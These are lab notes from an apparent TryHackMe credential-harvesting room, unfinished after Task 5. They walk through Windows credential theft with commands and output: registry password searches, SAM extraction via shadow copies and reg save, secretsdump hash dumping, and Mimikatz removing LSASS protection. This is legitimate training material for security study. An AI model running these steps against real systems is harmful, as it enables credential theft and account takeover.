# Credharvesting
- After gaining access to a system we need to find creds.

## Task 1 Intro
### Learning Objectives
- Understand the method of extracting credentials from local windows (SAM database)
- Learn how to access Windows memory and dump clear-text passwords and authentication tickets locally and remotely.
- Introduction to Windows Credentials Manager and how to extract credentials.
- Learn methods of extracting credentials for Domain Controller
- Enumerate the Local Administrator Password Solution (LAPS) feature.
- Introduction to AD attacks that lead to obtaining credentials.


## Task 2 Credential Harvesting
Credentials can be found in a variety of different forms, such as:
- Accounts details (usernames and passwords)
- Hashes that include NTLM hashes, etc.
- Authentication Tickets: Tickets Granting Ticket (TGT), Ticket Granting Server (TGS)
- Any information that helps login into a system (private keys, etc.)
## Task 3 Credential Access
Credentials are stored insecurely in various locations in systems:
-   Clear-text files
 -   Database files
 -   Memory
 -   Password managers
 -   Enterprise Vaults
 -   Active Directory
 -   Network Sniffing

### The following are some of the types of clear-text files that an attacker may be interested in:
- Commands history
-  Configuration files (Web App, FTP files, etc.)
- Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)
- Backup files
- Shared files and folders
- Registry
- Source code 

### As an example of a history command, a PowerShell saves executed PowerShell commands in a history file in a user profile in the following path: 
    C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 

    
### Searching for the "password" keyword in the Registry        
- c:\Users\user> reg query HKLM /f password /t REG_SZ /s
- C:\Users\user> reg query HKCU /f password /t REG_SZ /s

Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?
Use findstr to grep THM text only

```
PS C:\Users\thm> reg query HKLM /f password /t REG_SZ /s | findstr flag
  flag    REG_SZ    password: 7tyh4ckm3
```    

Enumerate the AD environment we provided. What is the password of the victim user found in the description section?
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

```
PS C:\Users\thm> Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description

Name          SamAccountName Description
----          -------------- -----------
Administrator Administrator  Built-in account for administering the computer/domain
Guest         Guest          Built-in account for guest access to the computer/domain
krbtgt        krbtgt         Key Distribution Center Service Account
THM User      thm
THM Victim    victim         Change the password: Passw0rd!@#
thm-local     thm-local
Admin THM     admin
svc-thm       svc-thm
THM Admin BK  bk-admin
test          test-user
sshd          sshd
```
## Task 4 Local Windows Credentials
Confirming No Access to the SAM Database 
```
C:\Windows\system32>type c:\Windows\System32\config\sam
type c:\Windows\System32\config\sam
The process cannot access the file because it is being used by another process.

C:\Windows\System32> copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\ 
copy c:\Windows\System32\config\sam C:\Users\Administrator\Desktop\
The process cannot access the file because it is being used by another process.
        0 file(s) copied.
```

Creating a Shadow Copy of Volume C with WMIC
- Be sure to run Administrator Command Prompt
```
C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'
Executing (Win32_ShadowCopy)->create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
        ShadowID = "{D8A11619-474F-40AE-A5A0-C2FAA1D78B85}";
```
Listing the Available Shadow Volumes
```
C:\Users\Administrator>vssadmin list shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {0c404084-8ace-4cb8-a7ed-7d7ec659bb5f}
   Contained 1 shadow copies at creation time: 5/31/2022 1:45:05 PM
      Shadow Copy ID: {d8a11619-474f-40ae-a5a0-c2faa1d78b85}
         Original Volume: (C:)\\?\Volume{19127295-0000-0000-0000-100000000000}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: Creds-Harvesting-AD.thm.red
         Service Machine: Creds-Harvesting-AD.thm.red
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers, Differential
```

Copying the SAM and SYSTEM file from the Shadow Volume
```
C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
        1 file(s) copied.

C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
        1 file(s) copied.
```
Save SAM and SYSTEM files from the registry
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```
Decrypting SAM Database using Impacket SecretsDump Script Locally
```
           
user@machine:~# python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:98d3a787a80d08385cea7fb4aa2a4261:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```
## Task 5 Local Security Authority Subsystem Service (LSASS)

- Disable Protected LSASS
-in admin cmd run ```cd C:\Tools\Mimikatz```
- ``` mimikatz.exe```


In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. This task will show how to disable the LSA protection and dump credentials from memory using Mimikatz. To enable LSASS protection, we can modify the registry RunAsPPL DWORD value in HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa to 1.

- The steps are similar to the previous section, which runs the Mimikatz execution file with admin privileges and enables the debug mode. If the LSA protection is enabled, we will get an error executing the "sekurlsa::logonpasswords" command.
- Failing to Dump Stored Password Due to the LSA Protection

           mimikatz # sekurlsa::logonpasswords
           ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

        

-The command returns a 0x00000005 error code message (Access Denied). Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

Loading the mimidrv Driver into Memory

           
```mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
``` 

- Note: If this fails with an isFileExist error, exit mimikatz, navigate to C:\Tools\Mimikatz\ and run the command again.
- Once the driver is loaded, we can disable the LSA protection by executing the following Mimikatz command:

### Removing the LSA Protection

    mimikatz # !processprotect /process:lsass.exe /remove
    Process : lsass.exe
    PID 528 -> 00/00 [0-0-0]
-Now, if we try to run the "sekurlsa::logonpasswords" command again, it must be executed successfully and show cached credentials in memory.


## Task 6 Windows Credential Manager










## Task 7 Domain Controller











## Task 8 Local Administrator Password Solution (LAPS)



## Task 9 Other Attacks



## Task 10 Conclusion 
        


